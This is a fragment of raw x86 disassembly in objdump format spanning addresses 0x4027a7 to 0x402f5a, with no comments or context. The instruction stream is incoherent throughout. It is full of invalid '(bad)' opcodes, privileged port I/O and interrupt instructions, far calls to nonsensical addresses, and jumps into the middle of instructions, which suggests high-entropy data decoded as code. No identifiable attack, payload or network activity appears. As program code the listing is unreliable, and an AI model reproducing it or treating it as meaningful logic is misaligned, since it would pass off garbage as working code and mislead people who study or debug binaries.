  4027a7:	outs   dx,BYTE PTR ds:[esi]
  4027a8:	dec    esp
  4027a9:	int3   
  4027aa:	fwait
  4027ab:	xchg   ebp,eax
  4027ac:	imul   ebx,DWORD PTR [ebx],0xe2db3802
  4027b2:	repz dec esi
  4027b4:	mov    al,ds:0xd47f1f95
  4027b9:	push   edi
  4027ba:	add    DWORD PTR [ebx-0x29727d],ebp
  4027c0:	fist   WORD PTR [ebp-0x66e30a0a]
  4027c6:	int3   
  4027c7:	add    eax,DWORD PTR [ecx+edx*4-0x13]
  4027cb:	jmp    DWORD PTR [ebx+0x3e1d46d6]
  4027d1:	adc    eax,DWORD PTR es:[edx+0x7d]
  4027d5:	in     eax,dx
  4027d6:	test   DWORD PTR [esi+ebp*4-0x50],ebx
  4027da:	add    bh,BYTE PTR [ebx+0x1356ea30]
  4027e0:	dec    eax
  4027e1:	js     0x40284a
  4027e3:	out    0xb5,al
  4027e5:	ret    0xd876
  4027e8:	xchg   esi,eax
  4027e9:	enter  0xcc7e,0x45
  4027ed:	mov    edx,edi
  4027ef:	rcl    DWORD PTR [ecx],1
  4027f1:	add    edi,DWORD PTR [esi-0x2a5d0711]
  4027f7:	jp     0x4027f6
  4027f9:	jge    0x402825
  4027fb:	outs   dx,DWORD PTR gs:[esi]
  4027fd:	add    bl,bh
  4027ff:	xchg   ebp,eax
  402800:	push   cs
  402801:	pusha  
  402802:	(bad)  
  402805:	inc    edi
  402807:	add    eax,DWORD PTR [edi+0x3708fac2]
  40280d:	arpl   WORD PTR [ebp-0x1e],sp
  402810:	cmp    DWORD PTR [ecx+0x54],edi
  402813:	jnp    0x4027d2
  402815:	fs je  0x402870
  402818:	cwde   
  402819:	cld    
  40281a:	out    dx,eax
  40281b:	jmp    0x4027ff
  40281d:	in     al,dx
  40281e:	xor    al,0x1c
  402820:	sub    bh,BYTE PTR [eax-0x52]
  402823:	cmp    BYTE PTR [edx+eiz*8-0x6],0x6c
  402828:	cli    
  402829:	(bad)  
  40282a:	xchg   edx,eax
  40282b:	mov    WORD PTR [ebp-0x4f2bc528],ss
  402831:	call   0x4d59:0x8ef949b4
  402838:	test   DWORD PTR [edx],edx
  40283a:	mov    DWORD PTR [eax+0x3e],ecx
  40283d:	retf   
  40283e:	popf   
  40283f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402840:	mov    ds:0x611fd289,eax
  402845:	pop    esi
  402846:	adc    bh,ch
  402848:	popf   
  402849:	scas   al,BYTE PTR es:[edi]
  40284a:	push   ds
  40284b:	out    0x36,al
  40284d:	mov    ah,0xab
  40284f:	mov    al,0x96
  402851:	test   DWORD PTR [edi-0x641f59a1],esp
  402857:	sbb    ecx,DWORD PTR ds:0xf4370f5
  40285d:	mov    dh,0xbe
  40285f:	jbe    0x40286f
  402861:	fldenv [ebx+0x76ae83da]
  402867:	adc    eax,0x21027757
  40286c:	jno    0x402822
  40286e:	sti    
  40286f:	jnp    0x4028c4
  402871:	cld    
  402872:	scas   al,BYTE PTR es:[edi]
  402873:	pushf  
  402874:	data16 fldcw WORD PTR [ecx+0x58d60081]
  40287b:	scas   al,BYTE PTR es:[edi]
  40287c:	scas   al,BYTE PTR es:[edi]
  40287d:	jl     0x4028d7
  40287f:	sub    al,ah
  402881:	bound  ebx,QWORD PTR [esi+0x61d5f10d]
  402887:	cmp    DWORD PTR [ecx+0x45],0xffffffc5
  40288b:	retf   
  40288c:	outs   dx,DWORD PTR ds:[esi]
  40288d:	lods   al,BYTE PTR ds:[esi]
  40288e:	lock dec ebp
  402890:	sub    BYTE PTR [eax],al
  402892:	push   esi
  402893:	sub    DWORD PTR [esi+ebx*1+0x56009a9f],0xe08d38cb
  40289e:	dec    DWORD PTR [edx+ebx*8+0x30]
  4028a2:	aad    0x1
  4028a4:	and    DWORD PTR [esi+0x8],edi
  4028a7:	je     0x4028d5
  4028a9:	dec    ebp
  4028aa:	stos   BYTE PTR es:[edi],al
  4028ab:	jmp    0x37a9:0xb1fad8c2
  4028b2:	and    al,BYTE PTR [esi-0x4a862540]
  4028b8:	sub    al,ch
  4028ba:	mov    esp,0xf7251cdf
  4028bf:	ins    DWORD PTR es:[edi],dx
  4028c0:	ja     0x4028bd
  4028c2:	std    
  4028c3:	sub    bh,BYTE PTR [ecx+0x6f]
  4028c6:	mov    ds:0xfbbb1bb7,al
  4028cb:	xor    al,0xd4
  4028cd:	jecxz  0x40292e
  4028cf:	(bad)  
  4028d0:	data16 shl BYTE PTR [edx-0x8934d2e],1
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	add    BYTE PTR [ecx+0x70a0ad71],ch
  4028de:	jae    0x402919
  4028e0:	push   es
  4028e1:	dec    esp
  4028e2:	aam    0x9a
  4028e4:	cmp    al,0xfa
  4028e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028e7:	cld    
  4028e8:	push   DWORD PTR [esi-0x775731fc]
  4028ee:	mov    ds:0x3cd70ad9,al
  4028f3:	pop    eax
  4028f4:	mov    edx,0x3618f892
  4028f9:	cmovne edi,ecx
  4028fc:	jbe    0x402941
  4028fe:	stos   BYTE PTR es:[edi],al
  4028ff:	jl     0x402931
  402901:	add    eax,0xfe66453f
  402906:	dec    ebx
  402907:	and    eax,DWORD PTR [edx]
  402909:	in     eax,dx
  40290a:	xor    al,0xa4
  40290c:	scas   al,BYTE PTR es:[edi]
  40290d:	lahf   
  40290e:	nop
  40290f:	mov    ch,0x28
  402911:	pop    es
  402912:	mov    ds:0xd5458902,eax
  402917:	mov    ecx,0x9d23c0cd
  40291c:	fsub   DWORD PTR [edx]
  40291e:	(bad)  
  402920:	push   eax
  402921:	cmp    al,BYTE PTR [ecx]
  402923:	fidiv  WORD PTR ds:0x52f268b5
  402929:	cdq    
  40292a:	mov    bl,BYTE PTR [esi-0x2b297191]
  402930:	mov    ds:0x8b75c6a9,eax
  402935:	add    BYTE PTR [edi-0x7f5210b],cl
  40293b:	test   eax,0xa55b0b18
  402940:	inc    eax
  402941:	imul   ecx,DWORD PTR [edx+0x7e28e61b],0x5db913f5
  40294b:	push   0x8a728a5a
  402950:	inc    edx
  402951:	js     0x4029c7
  402953:	dec    ebp
  402954:	mov    ecx,ecx
  402956:	mov    esi,0x7f26d62a
  40295b:	fadd   DWORD PTR [edx-0x337266ee]
  402961:	repnz fcom DWORD PTR [edx-0x11]
  402965:	cs clc 
  402967:	loop   0x4028fe
  402969:	or     al,0xd3
  40296b:	rcr    DWORD PTR [edi-0x586588db],0x6e
  402972:	cwde   
  402973:	jl     0x402955
  402975:	mov    ds:0xf7cf03a2,eax
  40297a:	mov    ds:0xc5eb73db,eax
  40297f:	xchg   edi,eax
  402980:	js     0x402976
  402982:	adc    eax,0x4cdb65d5
  402987:	test   ch,bl
  402989:	fwait
  40298a:	dec    edx
  40298b:	ins    DWORD PTR es:[edi],dx
  40298c:	lock lea ecx,[eax+0x28891d9e]
  402993:	mov    eax,0xec0096dc
  402998:	loopne 0x402a07
  40299a:	pmuludq mm0,QWORD PTR gs:[ebx]
  40299e:	dec    esi
  40299f:	sbb    esp,DWORD PTR [ecx-0x2488cd61]
  4029a5:	fcmovb st,st(3)
  4029a7:	jns    0x402a00
  4029a9:	ins    DWORD PTR es:[edi],dx
  4029aa:	mov    dh,0xa8
  4029ac:	or     eax,0xa55ed7f0
  4029b1:	retf   
  4029b2:	je     0x402a2b
  4029b4:	rcl    DWORD PTR [edx],0xbc
  4029b7:	les    ebx,FWORD PTR [eax+eiz*8]
  4029ba:	fnstenv [eax-0x499e86de]
  4029c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029c2:	adc    BYTE PTR [edx-0x55b17b3b],dh
  4029c8:	push   edx
  4029c9:	(bad)  
  4029ca:	retf   0x49c3
  4029cd:	(bad)  
  4029ce:	adc    edx,DWORD PTR [ebp-0x485f9ce2]
  4029d4:	test   al,0x2a
  4029d6:	mov    dh,0x27
  4029d8:	aam    0x39
  4029da:	arpl   WORD PTR [edi-0x602516a3],sp
  4029e0:	les    ebx,FWORD PTR [edi*4+0xcb57dfd]
  4029e7:	cmp    BYTE PTR [ebx+0x70],dl
  4029ea:	mov    esp,es
  4029ec:	jno    0x4029fa
  4029ee:	cli    
  4029ef:	mov    WORD PTR [ebx-0x1c9fff9],?
  4029f5:	mov    ch,0x21
  4029f7:	mov    ds:0x44699dd5,eax
  4029fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029fd:	sub    BYTE PTR [ebx],dh
  4029ff:	lods   eax,DWORD PTR ds:[esi]
  402a00:	xchg   ecx,ebp
  402a02:	dec    sp
  402a04:	mov    ds:0x116c9679,eax
  402a09:	or     ebp,DWORD PTR [edx]
  402a0b:	pop    ebx
  402a0c:	mov    ds:0xd4966169,al
  402a11:	aas    
  402a12:	and    esp,edx
  402a14:	addr16 pusha 
  402a16:	mov    bh,0xd5
  402a18:	test   BYTE PTR [ebp-0x6aa1abd2],bh
  402a1e:	shl    ah,cl
  402a20:	lock sbb bh,0x4a
  402a24:	stc    
  402a25:	(bad)  
  402a26:	sbb    dh,BYTE PTR [eax]
  402a28:	cwde   
  402a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a2a:	fmul   QWORD PTR [ecx-0x5c]
  402a2d:	fwait
  402a2e:	pop    edi
  402a2f:	pop    esi
  402a30:	rcl    DWORD PTR [esi+0x19],0x3
  402a34:	sbb    eax,ebx
  402a36:	add    BYTE PTR [ecx-0x1e],bh
  402a39:	pop    ebx
  402a3a:	iret   
  402a3b:	and    al,0x40
  402a3d:	sahf   
  402a3e:	imul   edi,DWORD PTR [edi+0x46b90bfc],0x45
  402a45:	add    DWORD PTR [esi+ebx*2],edi
  402a48:	inc    ecx
  402a49:	test   BYTE PTR [esi],cl
  402a4b:	pop    edx
  402a4c:	mov    ebx,0x66ab63cc
  402a51:	(bad)  
  402a52:	aas    
  402a53:	sub    al,dh
  402a55:	jno    0x4029dc
  402a57:	repz icebp 
  402a59:	je     0x4029fb
  402a5b:	(bad)  
  402a5c:	adc    al,0x7f
  402a5e:	sbb    al,0xe5
  402a60:	fdiv   QWORD PTR [ecx+0x1d72d62e]
  402a66:	call   0xaf93:0xac47f64d
  402a6d:	mov    ds:0x39ddc88a,eax
  402a72:	sbb    DWORD PTR [edi+0x2260b202],edx
  402a78:	xor    ecx,DWORD PTR [ebp+0x27]
  402a7b:	push   ebx
  402a7c:	sar    BYTE PTR [esi],0x7f
  402a7f:	jb     0x402ac9
  402a81:	fst    DWORD PTR [ebx]
  402a83:	inc    ecx
  402a84:	loopne 0x402a0a
  402a86:	sti    
  402a87:	adc    BYTE PTR [esi+0x75],ah
  402a8a:	pop    ecx
  402a8b:	add    bl,BYTE PTR [edi+0x7730c37]
  402a91:	adc    bh,ah
  402a93:	mov    ebx,0xdfa99d4e
  402a98:	add    eax,ecx
  402a9a:	dec    esp
  402a9b:	sahf   
  402a9c:	lock mov DWORD PTR ds:0x229d05fe,edi
  402aa3:	sahf   
  402aa4:	icebp  
  402aa5:	or     DWORD PTR [edx],ebp
  402aa7:	in     eax,dx
  402aa8:	jmp    0x402af4
  402aaa:	xor    BYTE PTR [edi],ch
  402aac:	sub    DWORD PTR [esp+edx*4-0x26ab05ed],0x11727323
  402ab7:	ror    ebx,1
  402ab9:	inc    ebx
  402aba:	popf   
  402abb:	fisttp DWORD PTR [edx+0x7c]
  402abe:	(bad)  
  402abf:	and    DWORD PTR gs:[edi+0x5f1e2544],esi
  402ac6:	fistp  QWORD PTR [esi+0x29]
  402ac9:	and    ebp,edx
  402acb:	lea    ecx,ds:0x80ed4c3b
  402ad1:	jb     0x402a77
  402ad3:	sbb    eax,esi
  402ad5:	mov    ds:0x14147fc8,al
  402ada:	stc    
  402adb:	xchg   BYTE PTR [edi+ecx*8],cl
  402ade:	inc    ebx
  402adf:	xchg   ecx,eax
  402ae0:	push   ecx
  402ae1:	adc    DWORD PTR [ebx+0x3d035bb5],ebx
  402ae7:	dec    edx
  402ae8:	inc    esi
  402ae9:	xor    al,0x28
  402aeb:	leave  
  402aec:	and    DWORD PTR [eax-0x6525462e],ebp
  402af2:	in     al,dx
  402af3:	shl    BYTE PTR [esi+0x78b216ed],1
  402af9:	sbb    al,0x53
  402afb:	mov    edx,DWORD PTR [edi]
  402afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402aff:	sbb    esi,esi
  402b01:	adc    ecx,0xe40c1af2
  402b07:	(bad)  
  402b08:	out    0x13,al
  402b0a:	(bad)  [esi-0x29]
  402b0d:	je     0x402b52
  402b0f:	inc    esp
  402b10:	ficom  DWORD PTR [edx-0x3660779d]
  402b16:	test   DWORD PTR [ecx],edx
  402b18:	push   edi
  402b19:	push   ecx
  402b1a:	fwait
  402b1b:	(bad)  
  402b1c:	in     eax,dx
  402b1d:	adc    al,0x19
  402b1f:	and    edi,DWORD PTR [edx]
  402b21:	sub    esi,DWORD PTR [eax-0x358879e3]
  402b27:	mov    bh,0xa5
  402b29:	sbb    bh,BYTE PTR [edx-0x5c]
  402b2c:	bound  ebp,QWORD PTR [esi-0x64]
  402b2f:	pop    esp
  402b30:	daa    
  402b31:	dec    edi
  402b32:	xor    eax,0xcf51fb67
  402b37:	mov    WORD PTR [eax-0x384aa34a],gs
  402b3d:	mov    dh,0x66
  402b3f:	sbb    BYTE PTR [esi+eiz*4-0x28],al
  402b43:	sbb    eax,0xd4c0477b
  402b48:	or     esp,DWORD PTR [eax-0x64a5339b]
  402b4e:	cli    
  402b4f:	xchg   edx,eax
  402b50:	neg    dh
  402b52:	push   ds
  402b53:	in     eax,dx
  402b54:	xchg   edx,eax
  402b55:	jae    0x402bc2
  402b57:	sbb    al,0x19
  402b59:	mov    ds:0xd1318c40,eax
  402b5e:	sub    esi,DWORD PTR [esi-0x6e335ef8]
  402b64:	jp     0x402ba0
  402b66:	std    
  402b67:	ret    
  402b68:	rcr    BYTE PTR [ecx+0x6d],1
  402b6b:	int    0x57
  402b6d:	(bad)  
  402b6e:	mov    ah,cl
  402b70:	sbb    DWORD PTR ss:[ecx-0x3b],esp
  402b74:	dec    eax
  402b75:	mov    esp,0xaaf085b7
  402b7a:	mov    bl,0x43
  402b7c:	daa    
  402b7d:	push   es
  402b7e:	push   cs
  402b7f:	adc    DWORD PTR [ebx+0x4a],edi
  402b82:	xchg   edi,eax
  402b83:	cdq    
  402b84:	loopne 0x402bf2
  402b86:	pop    ecx
  402b87:	data16 hlt 
  402b89:	int    0x1f
  402b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b8c:	aad    0xd9
  402b8e:	shl    ebx,cl
  402b90:	or     al,0xdb
  402b92:	jmp    DWORD PTR [ebx-0x15]
  402b95:	mov    esp,0xa757f2f4
  402b9a:	xor    BYTE PTR [eax+0x52eb5051],dl
  402ba0:	iret   
  402ba1:	cdq    
  402ba2:	push   0x30
  402ba4:	xor    bh,0x8b
  402ba7:	fimul  DWORD PTR [eax]
  402ba9:	sbb    eax,0x23c1f375
  402bae:	push   esp
  402baf:	(bad)  
  402bb0:	cmp    eax,0x1dde13d8
  402bb5:	adc    al,0x8a
  402bb7:	jo     0x402be3
  402bb9:	fwait
  402bba:	aam    0xc7
  402bbc:	jecxz  0x402bb1
  402bbe:	cmp    ecx,DWORD PTR [eax]
  402bc0:	mov    esp,0xea404d5c
  402bc5:	fstp   st(1)
  402bc7:	fcomip st,st(4)
  402bca:	dec    ecx
  402bcb:	ins    DWORD PTR es:[edi],dx
  402bcc:	into   
  402bcd:	pcmpeqb mm0,mm6
  402bd0:	lods   al,BYTE PTR ds:[esi]
  402bd1:	mov    cl,0x8f
  402bd3:	and    eax,0x89dc68c2
  402bd8:	and    al,0xf6
  402bda:	jno    0x402c41
  402bdc:	pop    es
  402bdd:	cwde   
  402bde:	loopne 0x402c24
  402be0:	aam    0x67
  402be2:	outs   dx,BYTE PTR ds:[esi]
  402be3:	hlt    
  402be4:	fsubr  DWORD PTR [eax+eax*1+0x6c]
  402be8:	gs repnz stos BYTE PTR es:[edi],al
  402beb:	mov    cl,0xe7
  402bed:	(bad)  
  402bee:	or     esp,eax
  402bf0:	adc    eax,0xb60d9418
  402bf5:	adc    ch,al
  402bf7:	not    BYTE PTR [edi-0x4a]
  402bfa:	cmc    
  402bfb:	cwde   
  402bfc:	rcl    al,1
  402bfe:	mov    cl,0xa2
  402c00:	ds ja  0x402c3e
  402c03:	aam    0xe1
  402c05:	popa   
  402c06:	fisttp DWORD PTR [esi-0x2f]
  402c09:	mov    ah,0x6c
  402c0b:	out    0xbb,eax
  402c0d:	jo     0x402bfc
  402c0f:	loopne 0x402be1
  402c11:	jns    0x402ba6
  402c13:	xchg   ebx,eax
  402c14:	push   cs
  402c15:	fimul  DWORD PTR [ebx]
  402c17:	mov    ecx,0xd6ad2157
  402c1c:	fnsave [edi]
  402c1e:	push   ebx
  402c1f:	xchg   DWORD PTR [ebx],ebp
  402c21:	jae    0x402bc4
  402c23:	xor    esi,eax
  402c25:	mov    WORD PTR [esi],gs
  402c27:	push   ebx
  402c28:	xor    eax,0x64db0dbd
  402c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c2e:	loopne 0x402c1c
  402c30:	pop    edi
  402c31:	mov    al,0xc9
  402c33:	jl     0x402c6e
  402c35:	xor    al,0xb3
  402c37:	push   eax
  402c38:	pop    ss
  402c39:	pop    ds
  402c3a:	popa   
  402c3b:	ja     0x402c24
  402c3d:	(bad)  [eax+0x6b9eacc0]
  402c43:	sub    eax,0x37764d8e
  402c48:	dec    ecx
  402c49:	fidivr WORD PTR [ebx-0x50845c69]
  402c4f:	pop    ds
  402c50:	mov    ecx,0xfc2b0893
  402c55:	shl    dl,1
  402c57:	(bad)  [edi]
  402c59:	call   0xf604a7df
  402c5e:	pop    eax
  402c5f:	jb     0x402c12
  402c61:	mov    dh,0x15
  402c63:	push   edx
  402c64:	push   ecx
  402c65:	(bad)  
  402c66:	mov    esp,0x74f92e97
  402c6b:	xchg   ebp,eax
  402c6c:	xchg   bx,ax
  402c6e:	les    ebp,FWORD PTR [esi-0x78]
  402c71:	inc    ecx
  402c72:	jbe    0x402c63
  402c74:	int    0xa5
  402c76:	test   BYTE PTR [ebp+0x1c],bl
  402c79:	loopne 0x402c66
  402c7b:	add    ch,ah
  402c7d:	test   al,0xab
  402c7f:	loop   0x402cea
  402c81:	lods   al,BYTE PTR ds:[esi]
  402c82:	pusha  
  402c83:	(bad)  [ebx-0x5da0e375]
  402c89:	fdiv   DWORD PTR [eax+0x38]
  402c8c:	test   al,0x73
  402c8e:	push   edi
  402c8f:	addr16 and al,0x77
  402c92:	lahf   
  402c93:	imul   esi,ebp,0xffffff93
  402c96:	and    al,0x9a
  402c98:	loope  0x402c3b
  402c9a:	jo     0x402cbd
  402c9c:	loope  0x402cf4
  402c9e:	nop/reserved BYTE PTR [edx-0x45]
  402ca2:	ret    0x3879
  402ca5:	retf   
  402ca6:	lock cdq 
  402ca8:	pop    ss
  402ca9:	and    DWORD PTR [eax],ecx
  402cab:	jo     0x402c96
  402cad:	mov    ds:0xd5a4c85b,eax
  402cb2:	(bad)  
  402cb3:	jno    0x402c4b
  402cb5:	call   0x299fdb23
  402cba:	cld    
  402cbb:	jnp    0x402d37
  402cbd:	sub    bh,BYTE PTR [esi+0x13]
  402cc0:	outs   dx,BYTE PTR ds:[esi]
  402cc1:	pop    esp
  402cc2:	scas   eax,DWORD PTR es:[edi]
  402cc3:	imul   ebp,edx,0x78084313
  402cc9:	icebp  
  402cca:	xchg   cl,cl
  402ccc:	daa    
  402ccd:	push   ebx
  402cce:	dec    ebp
  402ccf:	out    0x3e,eax
  402cd1:	dec    esp
  402cd2:	cmp    BYTE PTR [esi+0x2c],ah
  402cd5:	sub    eax,0xcfec1a12
  402cda:	addr16 pop eax
  402cdc:	sbb    dh,BYTE PTR ds:0x96c397ed
  402ce2:	jp     0x402ccc
  402ce4:	fwait
  402ce5:	push   cs
  402ce6:	scas   eax,DWORD PTR es:[edi]
  402ce7:	lock das 
  402ce9:	mov    DWORD PTR gs:[ecx-0x1b13e52f],edx
  402cf0:	enter  0x459d,0xd9
  402cf4:	inc    esp
  402cf5:	ror    al,0x6d
  402cf8:	mov    edi,DWORD PTR [ebx]
  402cfa:	in     eax,dx
  402cfb:	mov    esi,0x65bd7207
  402d00:	xchg   esp,eax
  402d01:	mov    bl,0x46
  402d03:	mov    dh,0xf9
  402d05:	inc    edi
  402d06:	inc    esp
  402d07:	jb     0x402c91
  402d09:	inc    ebp
  402d0a:	xchg   esi,eax
  402d0b:	je     0x402d8c
  402d0d:	mov    ah,0xf6
  402d0f:	dec    esi
  402d10:	ret    0x595a
  402d13:	scas   eax,DWORD PTR es:[edi]
  402d14:	xchg   DWORD PTR [esi+0x4b],eax
  402d17:	clc    
  402d18:	inc    eax
  402d19:	jns    0x402cba
  402d1b:	hlt    
  402d1c:	mov    edi,0xab1660b6
  402d21:	jl     0x402d98
  402d23:	fdivr  QWORD PTR [edx]
  402d25:	mov    eax,ds:0x4bf6f6ed
  402d2a:	stos   BYTE PTR es:[edi],al
  402d2b:	lea    edx,[esi+0x18540bce]
  402d31:	add    ah,BYTE PTR [edi+eax*4+0x38]
  402d35:	inc    esi
  402d36:	dec    ebx
  402d37:	sti    
  402d38:	or     DWORD PTR [ebx+ecx*1],esi
  402d3b:	sub    al,cl
  402d3d:	mov    esp,0xdf1dea18
  402d42:	retf   0x269e
  402d45:	out    dx,al
  402d46:	lods   al,BYTE PTR ds:[esi]
  402d48:	xor    DWORD PTR ds:0xa34afbc9,edx
  402d4e:	sbb    DWORD PTR ds:0x66a4b475,0xa8e76a98
  402d58:	xchg   edi,eax
  402d59:	and    DWORD PTR [edx+0x7f38990f],ecx
  402d5f:	mov    ch,0xff
  402d61:	xchg   esp,eax
  402d62:	fsub   DWORD PTR [ecx+0x1b]
  402d65:	sti    
  402d66:	aam    0xfe
  402d68:	pop    es
  402d69:	sahf   
  402d6a:	xlat   BYTE PTR ds:[ebx]
  402d6b:	das    
  402d6c:	aam    0x25
  402d6e:	daa    
  402d6f:	dec    ecx
  402d70:	jge    0x402d4d
  402d72:	fmul   QWORD PTR ds:0x807d243c
  402d78:	in     eax,dx
  402d79:	jecxz  0x402d15
  402d7b:	add    BYTE PTR [ecx-0x1fb68a4a],0x44
  402d82:	mov    edi,0x6e8cf139
  402d87:	aaa    
  402d88:	rcl    DWORD PTR [bp+si-0x4203],0x74
  402d8e:	cmc    
  402d8f:	xchg   edx,eax
  402d90:	jbe    0x402d8a
  402d92:	fwait
  402d93:	call   DWORD PTR [edx]
  402d95:	cmc    
  402d96:	jg     0x402df2
  402d98:	add    al,0x53
  402d9a:	int3   
  402d9b:	call   0xd7f1:0x14ddee9a
  402da2:	enter  0x5154,0x2
  402da6:	test   DWORD PTR [eax+0x433e776f],eax
  402dac:	fbld   TBYTE PTR [ebx+ebx*1]
  402daf:	jge    0x402d92
  402db1:	imul   edi,DWORD PTR [eax],0xd41aa47f
  402db7:	sbb    al,0x69
  402db9:	dec    esp
  402dba:	xor    edi,DWORD PTR [ecx+0x17e4bf5a]
  402dc0:	imul   eax,DWORD PTR [ebp-0x12],0x67
  402dc4:	stos   DWORD PTR es:[edi],eax
  402dc5:	(bad)  
  402dc6:	push   ss
  402dc7:	xchg   cl,ah
  402dc9:	cs cmp al,0xe3
  402dcc:	pop    esi
  402dcd:	sbb    DWORD PTR [ebx-0x2d],0xffffffc6
  402dd1:	pushf  
  402dd2:	test   BYTE PTR [ebx-0x568ed1c7],bh
  402dd8:	mov    al,dl
  402dda:	in     eax,0x8c
  402ddc:	xchg   edx,eax
  402ddd:	sbb    edx,DWORD PTR [eax]
  402ddf:	pop    ebx
  402de0:	and    BYTE PTR [eax-0x35b35885],dl
  402de6:	jne    0x402e3f
  402de8:	dec    esp
  402de9:	stos   BYTE PTR es:[edi],al
  402dea:	leave  
  402deb:	adc    edx,edx
  402ded:	sahf   
  402dee:	mov    al,ds:0x4be671cc
  402df3:	repz and DWORD PTR [ebx-0x5289f300],ebp
  402dfa:	cmp    cl,BYTE PTR [ebx+0x57]
  402dfd:	adc    DWORD PTR [eax-0x3c54ca26],eax
  402e03:	leave  
  402e04:	in     eax,0x4b
  402e06:	push   ss
  402e07:	ins    BYTE PTR es:[edi],dx
  402e08:	ins    DWORD PTR es:[edi],dx
  402e09:	mov    dh,0x15
  402e0b:	cmp    DWORD PTR [esi-0x56fa8491],0x51536250
  402e15:	jbe    0x402e7f
  402e17:	int    0xbb
  402e19:	iret   
  402e1a:	call   FWORD PTR [ebp+0xb]
  402e1d:	inc    edi
  402e1e:	sub    DWORD PTR [edi-0x40],edx
  402e21:	ret    0x8a54
  402e24:	sbb    cl,BYTE PTR [edx+0x1e40e91e]
  402e2a:	fcmovnb st,st(7)
  402e2c:	mov    ebx,0x5157f3ae
  402e31:	enter  0xd49d,0xbb
  402e35:	jmp    0x460f23c
  402e3a:	std    
  402e3b:	int3   
  402e3c:	clc    
  402e3d:	adc    DWORD PTR [ebx],edi
  402e3f:	xchg   edi,eax
  402e40:	aam    0x45
  402e42:	pop    edi
  402e43:	rol    edx,1
  402e45:	fistp  WORD PTR [esi+0x7b678e40]
  402e4b:	rol    DWORD PTR [edi+ebx*8+0x7f8cff5a],0xc1
  402e53:	mov    al,ds:0xaeb0d154
  402e58:	in     eax,0x24
  402e5a:	inc    ecx
  402e5b:	mov    WORD PTR [ebp+0x4],?
  402e5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e5f:	mov    DWORD PTR [eax],esi
  402e61:	aaa    
  402e62:	inc    edx
  402e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e64:	mul    DWORD PTR [esi+0x215c65e7]
  402e6a:	push   edx
  402e6b:	fadd   DWORD PTR ds:0xb225cdb6
  402e71:	adc    ebx,DWORD PTR [ebx+edi*1]
  402e74:	push   ss
  402e75:	jae    0x402eee
  402e77:	push   eax
  402e78:	mov    ds:0xd98da689,al
  402e7d:	push   esp
  402e7e:	pop    edi
  402e7f:	call   0x4088f521
  402e84:	fwait
  402e85:	dec    esp
  402e86:	cmc    
  402e87:	retf   
  402e88:	jp     0x402e3a
  402e8a:	mov    ds:0xea83d013,al
  402e8f:	jne    0x402ea7
  402e91:	int    0x33
  402e93:	ins    DWORD PTR es:[edi],dx
  402e94:	jg     0x402e32
  402e96:	fmulp  st(0),st
  402e98:	mov    ah,0xb5
  402e9a:	fadd   QWORD PTR [edi]
  402e9c:	push   edx
  402e9d:	fsubr  st,st(3)
  402e9f:	(bad)  
  402ea0:	out    0x76,eax
  402ea2:	push   es
  402ea3:	test   al,0x97
  402ea5:	mov    edx,0x5c2b4b8e
  402eaa:	call   0xcc813cfc
  402eaf:	cmp    DWORD PTR [edi-0x37ef1932],esp
  402eb5:	pop    ecx
  402eb6:	adc    bl,dl
  402eb8:	sbb    ah,al
  402eba:	retf   
  402ebb:	lea    esp,[ecx-0x4e]
  402ebe:	dec    ebp
  402ebf:	push   es
  402ec0:	jmp    0x96bbcd6
  402ec5:	push   ds
  402ec6:	aam    0x1b
  402ec8:	hlt    
  402ec9:	in     al,dx
  402eca:	push   eax
  402ecb:	dec    edi
  402ecc:	in     eax,0x12
  402ece:	push   es
  402ecf:	adc    al,0x45
  402ed1:	(bad)  
  402ed2:	jo     0x402ee6
  402ed4:	and    ecx,DWORD PTR [edx+ebp*4]
  402ed7:	sub    eax,0x12fa9c0f
  402edc:	lods   al,BYTE PTR ds:[esi]
  402edd:	out    dx,al
  402ede:	mov    dl,0xc0
  402ee0:	pop    ds
  402ee1:	loopne 0x402f60
  402ee3:	jle    0x402eba
  402ee5:	stos   DWORD PTR es:[edi],eax
  402ee6:	not    dh
  402ee8:	adc    al,0xe3
  402eea:	outs   dx,BYTE PTR ds:[esi]
  402eeb:	mov    ebx,0x98b51ea
  402ef0:	dec    ecx
  402ef1:	out    dx,eax
  402ef2:	mov    bh,0xfb
  402ef4:	enter  0xa60b,0x81
  402ef8:	adc    ebx,DWORD PTR [edx+0x59]
  402efb:	pop    ecx
  402efc:	cli    
  402efd:	inc    eax
  402efe:	mov    ecx,0xa4007342
  402f03:	sub    ch,BYTE PTR [edi-0x6f]
  402f06:	xchg   ebp,eax
  402f07:	xlat   BYTE PTR ds:[ebx]
  402f08:	mov    ebx,0xb0809797
  402f0d:	cs ss push ss
  402f10:	mov    bl,0x6
  402f12:	and    DWORD PTR [eax-0x7f7fbe51],esi
  402f18:	and    ecx,DWORD PTR [ebx]
  402f1a:	push   es
  402f1b:	cmc    
  402f1c:	outs   dx,BYTE PTR ds:[esi]
  402f1d:	int    0xf
  402f1f:	call   0x92cab7e8
  402f24:	and    dl,ah
  402f26:	in     al,dx
  402f27:	loope  0x402f03
  402f29:	ss stos DWORD PTR es:[edi],eax
  402f2b:	add    esp,ecx
  402f2d:	out    dx,al
  402f2e:	int    0xc8
  402f30:	cmp    ecx,DWORD PTR [ebp+edx*2-0x6e]
  402f34:	icebp  
  402f35:	pop    ebp
  402f36:	mov    bl,0x10
  402f38:	popf   
  402f39:	mov    esi,0x7eeabde8
  402f3e:	mov    esp,0xe783b1e9
  402f43:	adc    eax,0x60317495
  402f48:	mov    al,ds:0xebce905c
  402f4d:	pop    ebp
  402f4e:	int3   
  402f4f:	outs   dx,BYTE PTR ds:[esi]
  402f50:	fidiv  DWORD PTR [ecx]
  402f52:	jns    0x402fc8
  402f54:	sub    eax,0x3421e0cc
  402f59:	sahf   
  402f5a:	shr    DWORD PTR es:[ebp-0x1eee4963],0x65
